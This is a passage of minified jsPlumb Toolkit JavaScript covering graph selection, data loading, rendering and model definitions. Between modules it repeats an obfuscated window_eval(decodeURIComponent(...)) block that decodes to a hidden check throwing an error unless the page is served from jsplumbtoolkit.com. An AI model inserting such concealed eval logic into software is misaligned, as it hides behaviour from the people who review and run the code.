                if (null != d) for (var j = d[b]({filter: a.filter}), k = 0; k < j.length; k++) {
                    var l = f && d === O || j[k].source === d || c && j[k].source.constructor === e.Port && j[k].source.getNode() === d,
                        m = h && d === O || j[k].target === d || c && j[k].target.constructor === e.Port && j[k].target.getNode() === d;
                    (f && l || h && m || i && (l || m)) && g(j[k])
                }
            };
            return h(U(a.source), !0, !1, !1), h(U(a.target), !1, !0, !1), h(U(a.element), !1, !1, !0), d
        };
        this.getEdges = function (a) {
            return V(a, "getEdges", !1)
        }, this.getAllEdges = function () {
            return O.getAllEdges()
        }, this.getAllEdgesFor = function (a, b) {
            return a.getAllEdges({filter: b})
        }, this.selectAllEdges = function () {
            return this.filter(function (a) {
                return "Edge" === a.objectType
            })
        }, this.addAllEdgesToSelection = function () {
            this.addToSelection(this.getAllEdges())
        };
        var W, X, Y, Z = function (b, c, e) {
            b = b || {};
            var f = b.type || "json", g = b.data, h = b.url, i = b.jsonp, j = b.onload, k = b.parameters || {},
                l = b.error || function () {
                };
            if (null == g && null == h) throw new TypeError("You must supply either data or url to load.");
            var m = function (b) {
                W = b, X = f, Y = !0, v.fire(c), a.jsPlumbToolkitIO.parse(f, b, v, k), da(e), j && j(v, b), v.fire("graphChanged")
            };
            if (g) m(g); else if (h) {
                if (i) {
                    var n = -1 === h.indexOf("?") ? "?" : "&";
                    h = h + n + "callback=?"
                }
                var o = "json" === f ? f : b.dataType, p = b.headers || {Accept: "application/json"};
                d.ajax({url: h, success: m, dataType: o, error: l, headers: p})
            }
            return v
        };
        this.load = function (a) {
            return Z(a, "dataLoadStart", "dataLoadEnd")
        }, this.append = function (a) {
            return Z(a, "dataAppendStart", "dataAppendEnd")
        }, this.save = function (a) {
            a = a || {};
            var b = this.exportData(a), e = {"Content-Type": "application/json"};
            return c.extend(e, a.headers || {}), d.ajax({
                url: a.url,
                type: "POST",
                data: b,
                success: a.success || function () {
                },
                error: a.error || function () {
                },
                headers: e
            }), v
        }, this.exportData = function (b) {
            return b = b || {}, a.jsPlumbToolkitIO.exportData(b.type || "json", v, b.parameters)
        };
        var $ = function (a) {
            return new d.Selection({
                toolkit: v, onClear: a || function () {
                }
            })
        }, _ = $(function (a) {
            v.fire("selectionCleared", {selection: a})
        });
        i.maxSelectedNodes && _.setMaxNodes(i.maxSelectedNodes), i.maxSelectedEdges && _.setMaxEdges(i.maxSelectedEdges), i.selectionCapacityPolicy && _.setCapacityPolicy(i.selectionCapacityPolicy);
        var aa = function (a, b, c, d) {
            return b || c.clear(!0), c.append(a, function (a) {
                d && v.fire("select", {append: b, obj: a, selection: c})
            })
        };
        this.setSelection = function (a) {
            aa(a, !1, _, !0)
        }, this.select = function (a, b) {
            var c = $(), d = aa(a, !0, c);
            if (b) for (var e = 0; e < d[0].length; e++) {
                var f = d[0][e];
                if ("Node" === f.objectType || "Port" === f.objectType) for (var g = f.getAllEdges(), h = 0; h < g.length; h++) c.append(g[h])
            }
            return c
        };
        var ba = function (a, b, c, d) {
            for (var e = a.getAllEdges(), f = 0, g = e.length; f < g; f++) if (e[f].source === a || e[f].getNode && e[f].getNode() === a) {
                var h = e[f].target, i = h.getFullId();
                d[i] || (b.append(h), c && b.append(e[f]), d[i] = !0, ba(h, b, c, d))
            }
        };
        this.selectDescendants = function (a, b, c) {
            var d = v.getObjectInfo(a), e = $();
            if (d.obj && "Node" === d.obj.objectType) {
                b && aa(d.obj, !0, e);
                var f = {};
                f[d.obj.getFullId()] = !0, ba(d.obj, e, c, f)
            }
            return e
        }, this.filter = function (a, b) {
            var c = "function" == typeof a ? a : function (c) {
                var d = c.data, e = !1;
                for (var f in a) {
                    var g = a[f] === d[f];
                    if (!g && !b) return !1;
                    e = e || g
                }
                return e
            }, d = $();
            return this.eachNode(function (a, b) {
                c(b) && d.append(b);
                for (var e = b.getPorts(), f = 0; f < e.length; f++) c(e[f]) && d.append(e[f])
            }), this.eachEdge(function (a, b) {
                c(b) && d.append(b)
            }), this.eachGroup(function (a, b) {
                c(b) && d.append(b)
            }), d
        }, this.addToSelection = function (a) {
            var b = this.getObjectInfo(a);
            if (b) {
                var c = aa(b.obj, !0, _, !0);
                ca("deselect", c[1]), ca("select", c[0])
            }
        };
        var ca = function (a, b) {
            for (var c = 0; c < b.length; c++) v.fire(a, {obj: b[c], selection: _})
        };
        this.toggleSelection = function (a) {
            var b = this.getObjectInfo(a);
            if (b) {
                var c = [], d = _.toggle(b.obj, function (a, b) {
                    b || c.push(a)
                });
                ca("deselect", d[1]), ca("deselect", c), ca("select", d[0])
            }
        }, this.removeFromSelection = function (a) {
            var b = this.getObjectInfo(a);
            b && _.remove(b.obj, function (a) {
                v.fire("deselect", {obj: a, selection: _})
            })
        }, this.addPathToSelection = function (a) {
            this.addToSelection(this.getPath(a))
        }, this.selectAll = function () {
            throw new TypeError("not implemented")
        }, this.clearSelection = _.clear, this.getSelection = function () {
            return _
        }, this.setMaxSelectedNodes = function (a) {
            _.setMaxNodes(a)
        }, this.setMaxSelectedEdges = function (a) {
            _.setMaxEdges(a)
        }, this.setSelectionCapacityPolicy = function (a) {
            _.setCapacityPolicy(a)
        };
        var da = function (a) {
            v.setSuspendGraph(!0), v.fire(a), v.setSuspendGraph(!1), Y = !1
        }, ea = {};
        if (this.render = function (e, f) {
            var g = c.extend({}, f || {});
            c.extend(g, e), g.toolkit = v, null != e.selection && (e.selection.constructor === d.Selection ? g.toolkit = e.selection : g.toolkit = new d.Selection({
                generator: e.selection,
                toolkit: v
            }));
            var h = g.type || a.jsPlumbToolkit.DefaultRendererType, i = new a.jsPlumbToolkit.Renderers[h](g),
                j = g.id || b.uuid();
            return ea[j] = i, i.id = j, i._onDestroy = function (a) {
                delete ea[a.id]
            }, i
        }, this.getRenderer = function (a) {
            return ea[a]
        }, this.getRenderers = function () {
            return ea
        }, this.getObjectInfo = function (a, d) {
            var e = {els: {}, obj: null, type: null, id: null, el: null}, f = function (a) {
                if (null != a) return a.jtk ? a : f(a.parentNode)
            }, g = function (a) {
                var b = {};
                for (var c in ea) b[c] = [ea[c], ea[c].getRenderedElement(a)];
                return b
            };
            if (null != a) {
                if (a.eachNode && a.eachEdge) return {obj: a};
                if (b.isArray(a)) return {obj: a};
                var h = c.getElement(a);
                if (null != h && h.jtk) e.el = h, e.obj = h.jtk.port || h.jtk.node || h.jtk.group; else if (null != a.tagName) {
                    var i = f(h);
                    null != i && (e.el = i, e.obj = i.jtk.port || i.jtk.node || i.jtk.group)
                } else {
                    if ("string" == typeof a ? a = this.getNode(a) : "object" == typeof a && void 0 === a.objectType && (a = this.getNode(j(a))), null == a) return e;
                    e.obj = a, null != d && (e.el = d(a))
                }
                null == d && (e.els = g(e.obj)), null != e.obj && (e.id = e.obj.id, e.type = e.obj.objectType)
            }
            return e
        }, i.data) {
            var fa = i.dataType || "json";
            v.load({data: i.data, type: fa})
        }
    }, b.extend(a.jsPlumbToolkitInstance, b.EventGenerator), a.jsPlumbToolkit = new a.jsPlumbToolkitInstance({}), a.jsPlumbToolkit.DefaultRendererType = null, a.jsPlumbToolkit.ready = c.ready, a.jsPlumbToolkit.Renderers = {}, a.jsPlumbToolkit.Widgets = {};
    var i = function (b) {
        return new a.jsPlumbToolkitInstance(b)
    };
    a.jsPlumbToolkit.newInstance = i, "undefined" != typeof exports && (exports.jsPlumbToolkit = a.jsPlumbToolkit, exports.newInstance = i)
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    var a = this, b = a.jsPlumbToolkit, c = a.jsPlumbToolkitUtil, d = a.jsPlumbUtil;
    b.Model = function (a, e) {
        a = a || {}, a.nodes = a.nodes || {}, a.edges = a.edges || {}, a.ports = a.ports || {}, a.groups = a.groups || {};
        var f, g, h = {}, i = function (b) {
            var d = c.mergeWithParents([b, "default"], a.nodes);
            return delete d.parent, d
        }, j = function (b) {
            var d = c.mergeWithParents([b, "default"], a.edges);
            return delete d.parent, d
        }, k = function (b, d) {
            var e = d && d.ports ? c.mergeWithParents([b, "default"], d.ports) : c.mergeWithParents([b, "default"], a.ports);
            return delete e.parent, e
        }, l = function (b) {
            var d = c.mergeWithParents([b, "default"], a.groups);
            return delete d.parent, d
        };
        if (void 0 !== e) {
            for (var m in a.edges) {
                if (f = j(m), f.overlays) for (g = 0; g < f.overlays.length; g++) if (d.isArray(f.overlays[g]) && f.overlays[g][1].events) for (var n in f.overlays[g][1].events) f.overlays[g][1].events[n] = function (a, b) {
                    return function (c, d) {
                        a.call(b, {overlay: c, e: d, component: c.component, edge: c.component.edge})
                    }
                }(f.overlays[g][1].events[n], f.overlays[g]);
                e.registerConnectionType(m, f)
            }
            for (g in a.ports) f = k(g), e.registerEndpointType(g, f);
            if (a.states) for (var o in a.states) h[o] = new b.UIState(o, a.states[o], e)
        }
        return {
            getNodeDefinition: i,
            getEdgeDefinition: j,
            getPortDefinition: k,
            getGroupDefinition: l,
            getState: function (a) {
                return h[a]
            }
        }
    }
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    var a = jsPlumbToolkit.ready, b = function (a) {
        var b = 0, c = function () {
            --b <= 0 && e()
        };
        this.add = function (d) {
            b++, jsPlumbToolkitUtil.ajax({
                url: d, success: function (b) {
                    var d = a.innerHTML;
                    d += b, a.innerHTML = d, c()
                }, error: function (a) {
                    c()
                }
            })
        }, this.ensureNotEmpty = function () {
            b <= 0 && e()
        }
    }, c = [], d = !1, e = function () {
        d = !0;
        for (var b = 0; b < c.length; b++) a.call(a, c[b])
    };
    jsPlumbToolkit.ready = function (b) {
        d ? a.call(a, b) : c.push(b)
    }, jsPlumb.ready(function () {
        var a = document.getElementById("jsPlumbToolkitTemplates");
        if (a) e(); else {
            a = document.createElement("div"), a.style.display = "none", a.id = "jsPlumbToolkitTemplates", document.body.appendChild(a);
            for (var c = new b(a), d = document.getElementsByTagName("script"), f = 0; f < d.length; f++) {
                var g = d[f].getAttribute("type"), h = d[f].getAttribute("src");
                "text/x-jtk-templates" == g && c.add(h)
            }
            c.ensureNotEmpty()
        }
    })
}.call("undefined" != typeof window ? window : this),
    window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    this.jsPlumbToolkit.Classes = {
        LASSO: "jtk-lasso",
        LASSO_SELECT_DEFEAT: "jtk-lasso-select-defeat",
        MINIVIEW: "jtk-miniview",
        MINIVIEW_CANVAS: "jtk-miniview-canvas",
        MINIVIEW_PANNER: "jtk-miniview-panner",
        MINIVIEW_ELEMENT: "jtk-miniview-element",
        MINIVIEW_GROUP_ELEMENT: "jtk-miniview-group-element",
        MINIVIEW_PANNING: "jtk-miniview-panning",
        MINIVIEW_COLLAPSE: "jtk-miniview-collapse",
        MINIVIEW_COLLAPSED: "jtk-miniview-collapsed",
        NODE: "jtk-node",
        PORT: "jtk-port",
        GROUP: "jtk-group",
        SELECT_DEFEAT: "jtk-drag-select-defeat",
        SURFACE: "jtk-surface",
        SURFACE_DIRECT: "jtk-surface-direct-render",
        SURFACE_NO_PAN: "jtk-surface-nopan",
        SURFACE_CANVAS: "jtk-surface-canvas",
        SURFACE_PAN: "jtk-surface-pan",
        SURFACE_PAN_LEFT: "jtk-surface-pan-left",
        SURFACE_PAN_TOP: "jtk-surface-pan-top",
        SURFACE_PAN_RIGHT: "jtk-surface-pan-right",
        SURFACE_PAN_BOTTOM: "jtk-surface-pan-bottom",
        SURFACE_PAN_ACTIVE: "jtk-surface-pan-active",
        SURFACE_SELECTED_ELEMENT: "jtk-surface-selected-element",
